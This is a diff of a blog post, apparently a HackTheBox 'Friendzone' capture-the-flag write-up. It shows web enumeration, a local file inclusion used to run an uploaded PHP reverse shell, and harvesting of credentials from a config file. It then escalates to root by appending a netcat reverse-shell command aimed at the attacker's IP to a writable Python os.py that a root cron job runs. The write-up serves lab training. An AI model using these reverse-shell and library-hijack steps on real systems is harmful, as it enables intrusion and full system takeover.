@@ -4,7 +4,7 @@ title: Hackthebox Friendzone Writeup
 categories: HackTheBox
 ---
 
-![placeholder](https://inar1.github.io/public/images/2019-07-16/friendzone-badge.png)
+![placeholder](https://inar1.github.io/public/images/2019-09-05/friendzone-badge.png)
 ## Explanation
 <a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.<br>
 This is a write-up of machine "Friendzone" on that website.<br>
@@ -531,7 +531,6 @@ Reconnecting with SMB1 for workgroup listing.
 {% endhighlight %}
 
 ### 2. Getting User
-
 At first, try to enumerate SMB because generally it does not take long.<br>
 We can find a credential.
 {% highlight shell %}
@@ -583,16 +582,13 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 {% endhighlight %}
 
 Directory "wordpress" has nothing interesting. However, we can find a new domain "friendzoneportal.red"
-![placeholder](https://inar1.github.io/public/images/2019-07-16/friendzone-badge.png)
+![placeholder](https://inar1.github.io/public/images/2019-09-05/2019-09-04-23-08-50.png)
 
 Then add following line and access.
 {% highlight shell %}
 10.10.10.123 friendzoneportal.red
 {% endhighlight %}
-![placeholder](https://inar1.github.io/public/images/2019-07-16/friendzone-badge.png)
 
-Sounds like nothing has been changed.<br>
-<br>
 Gobuster friendzoneportal.red:
 {% highlight shell %}
 root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,401,403' -u http://friendzoneportal.red
@@ -662,20 +658,196 @@ Then, try to look around each domains after adding following line in "/etc/hosts
 10.10.10.123 vpn.friendzoneportal.red
 {% endhighlight %}
 
-we can find a login form on "https://administrator1.friendzone.red".
-![placeholder](https://inar1.github.io/public/images/2019-07-16/friendzone-badge.png)
+Gobuster "https://administrator1.friendzone.red":
+{% highlight shell %}
+root@kali:~# gobuster dir --url https://administrator1.friendzone.red/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            https://administrator1.friendzone.red/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2019/09/04 21:09:27 Starting gobuster
+===============================================================
+/images (Status: 301)
+/login.php (Status: 200)
+/dashboard.php (Status: 200)
+/timestamp.php (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2019/09/04 21:35:39 Finished
+===============================================================
+{% endhighlight %}
 
-Then try to access with the previous credential.<br>
+we can find a login form on "https://administrator1.friendzone.red/login.php".
+![placeholder](https://inar1.github.io/public/images/2019-09-05/2019-09-04-23-13-14.png)
+
+we can also find an interesting php script "timestamp.php".
+![placeholder](https://inar1.github.io/public/images/2019-09-05/2019-09-04-23-13-35.png)
+
+Next, try to access with the previous credential.<br>
 It says go to "dashboard.php".
-![placeholder](https://inar1.github.io/public/images/2019-07-16/friendzone-badge.png)
+![placeholder](https://inar1.github.io/public/images/2019-09-05/2019-09-04-23-15-32.png)
 
 We found a shaddy website with php.
-![placeholder](https://inar1.github.io/public/images/2019-07-16/friendzone-badge.png)
+![placeholder](https://inar1.github.io/public/images/2019-09-05/2019-09-04-23-16-34.png)
 
 Then, go to "https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp" as he says.
-![placeholder](https://inar1.github.io/public/images/2019-07-16/friendzone-badge.png)
+![placeholder](https://inar1.github.io/public/images/2019-09-05/2019-09-04-23-17-32.png)
 
+We can see a paramter "timestamp".<br>
+Try to replace the parameter with "login".
+![placeholder](https://inar1.github.io/public/images/2019-09-05/2019-09-04-23-19-06.png)
 
+The webapp showed the output of "login.php" (If we put wrong password it says "Wrong!").<br>
+This means, we found possible LFI.<br>
+<br>
+Since we already know that the path for the "File" share is "/etc/Files".
+At this time, we need some assuming the path for "Development" share to be "/etc/Development".<br>
+Then, try to upload the <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">reverse shell</a> script and access with the LFI vulnerability.<br>
+Upload reverse shell:
+{% highlihght shell %}
+smb: \> put php-reverse-shell.php
+putting file php-reverse-shell.php as \php-reverse-shell.php (50.1 kb/s) (average 50.1 kb/s)
+smb: \> dir
+  .                                   D        0  Wed Sep  4 22:08:54 2019
+  ..                                  D        0  Wed Jan 23 23:51:02 2019
+  php-reverse-shell.php               A     5492  Wed Sep  4 22:08:54 2019
+
+		9221460 blocks of size 1024. 6369608 blocks available
+{% endhighlight %}
+
+Access to the reverse shell with browser after launching netcat listener:
+{% highlight shell %}
+https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell
+{% endhighlight %}
+
+Now we got a reverse shell.
+{% highlight shell %}
+root@kali:~# nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.19] from (UNKNOWN) [10.10.10.123] 44662
+Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 22:13:04 up  1:08,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+{% endhighlight %}
+
+By following command, we can achieve a full bash shell.
+{% highlight shell %}
+$ python -c "import pty; pty.spawn('/bin/bash')"
+www-data@FriendZone:/$ 
+{% endhighlight %}
+
+user.txt is in the directory ""
+{% highlight shell %}
+www-data@FriendZone:/home/friend$ cat user.txt
+cat user.txt
+a9ed20acecd6c5b6b52f474e15ae9a11
+{% endhighlight %}
 
 ### 3. Getting Root
+In the directory "/var/www", we can find a password for user "friend".
+{% highlight shell %}
+www-data@FriendZone:/var/www$ cat mysql_data.conf
+cat mysql_data.conf
+for development process this is the mysql creds for user friend
 
+db_user=friend
+
+db_pass=Agpyu12!0.213$
+
+db_name=FZ
+{% endhighlight %}
+
+Now we can ssh to the box with the credential
+{% highlight shell %}
+root@kali:~# ssh friend@10.10.10.123
+The authenticity of host '10.10.10.123 (10.10.10.123)' can't be established.
+ECDSA key fingerprint is SHA256:/CZVUU5zAwPEcbKUWZ5tCtCrEemowPRMQo5yRXTWxgw.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.123' (ECDSA) to the list of known hosts.
+friend@10.10.10.123's password: 
+Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+You have mail.
+Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3
+friend@FriendZone:~$ 
+{% endhighlight %}
+
+To enumerate Linux box, we can use a published script <a href="https://github.com/DominicBreuker/pspy">pspy</a>.<br>
+By running this script, we can find a cron job which runs "/opt/server-admin/reporter.py".
+{% highlight shell %}
+2019/09/04 22:34:01 CMD: UID=0    PID=3787   | /usr/bin/python /opt/server_admin/reporter.py 
+2019/09/04 22:34:01 CMD: UID=0    PID=3786   | /bin/sh -c /opt/server_admin/reporter.py 
+2019/09/04 22:34:01 CMD: UID=0    PID=3785   | /usr/sbin/CRON -f 
+{% endhighlight %}
+{% highlight shell %}
+friend@FriendZone:/opt/server_admin$ cat reporter.py 
+#!/usr/bin/python
+
+import os
+
+to_address = "admin1@friendzone.com"
+from_address = "admin2@friendzone.com"
+
+print "[+] Trying to send email to %s"%to_address
+
+#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
+
+#os.system(command)
+
+# I need to edit the script later
+# Sam ~ python developer
+{% endhighlight %}
+
+Also, By running <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>, we can find a world writable script.<br>
+{% highlight shell %}
+[-] Files not owned by user but writable by group:
+-rwxrw-rw- 1 nobody nogroup 5492 Sep  4 22:08 /etc/Development/php-reverse-shell.php
+-rwxrwxrwx 1 root root 25910 Jan 15  2019 /usr/lib/python2.7/os.py
+{% endhighlight %}
+
+Meaning we have following information.
+1. "/usr/bin/python2.7/os.py" is writable worldwide
+2. cron is executing "/opt/server-admin/reporter.py" in a couple of minute as root.
+3. "/opt/server-admin/reporter.py" is loading "/usr/bin/python2.7/os.py".
+
+This indicates that we can hijack the python library.<br>
+Then, run following command to add some new lines in os.py
+{% highlight shell %}
+friend@FriendZone:/opt/server_admin$ echo 'import os' >> /usr/lib/python2.7/os.py
+friend@FriendZone:/opt/server_admin$ echo 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 4444 >/tmp/f")' >> /usr/lib/python2.7/os.py
+{% endhighlight %}
+
+Then, launch a netcat listener
+{% highlight shell %}
+root@kali:~# nc -nlvp 4444
+listening on [any] 4444 ...
+{% endhighlight %}
+
+Couple of minutes later, we can get a root shell.
+{% highlight shell %}
+connect to [10.10.14.19] from (UNKNOWN) [10.10.10.123] 49954
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+{% endhighlight %}
+
+root.txt is in the root directory.
+{% highlight shell %}
+# cat /root/root.txt
+b0e6c60b82cf96e9855ac1656a9e90c7
+{% endhighlight %}
